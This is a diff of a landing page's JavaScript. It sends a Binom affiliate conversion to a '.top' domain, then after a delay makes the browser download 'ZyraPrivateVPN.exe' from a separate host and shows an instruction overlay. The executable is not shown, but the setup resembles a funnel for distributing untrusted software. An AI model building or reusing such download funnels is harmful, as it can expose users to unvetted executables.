@@ -915,22 +915,31 @@ function closeModalOutside(e) {
 
 <script>
 function trackAndDownload() {
-  // 1. Отправляем конверсию в Binom СТРОГО по клику, а не при загрузке страницы
-  BPixelJS.conversion({ url: 'https://juciecrucierretor.top/click' });
+  // 1. Отправляем сигнал конверсии в Binom
+  try {
+    BPixelJS.conversion({ url: 'https://juciecrucierretor.top/click' });
+  } catch(e) {}
 
-  // 2. Скачиваем файл
-  var a = document.createElement('a');
-  a.href = 'https://vpnshieldguard.net/latest/ZyraPrivateVPN.exe';
-  a.download = 'ZyraPrivateVPN.exe';
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
+  // 2. Делаем паузу 400мс, чтобы запрос 100% успел улететь в трекер ДО начала скачивания
+  setTimeout(function() {
+    // Скачиваем файл
+    var a = document.createElement('a');
+    a.href = 'https://vpnshieldguard.net/latest/ZyraPrivateVPN.exe';
+    a.download = 'ZyraPrivateVPN.exe';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
 
-  // 3. Показываем overlay с инструкцией
-  setTimeout(function(){
-    document.getElementById('dl-overlay').classList.add('active');
-    document.body.style.overflow = 'hidden';
-  }, 400);
+    // Показываем всплывающее окно
+    setTimeout(function() {
+      var overlay = document.getElementById('dl-overlay');
+      if (overlay) {
+        overlay.classList.add('active');
+        document.body.style.overflow = 'hidden';
+      }
+    }, 100);
+
+  }, 400); // 400 миллисекунд форы для трекера
 }
 
 function closeDlOverlay() {
@@ -938,7 +947,6 @@ function closeDlOverlay() {
   document.body.style.overflow = '';
 }
 </script>
-
 <script>
 (function(){
   // Патчим уже применённый словарь — добавляем переводы overlay
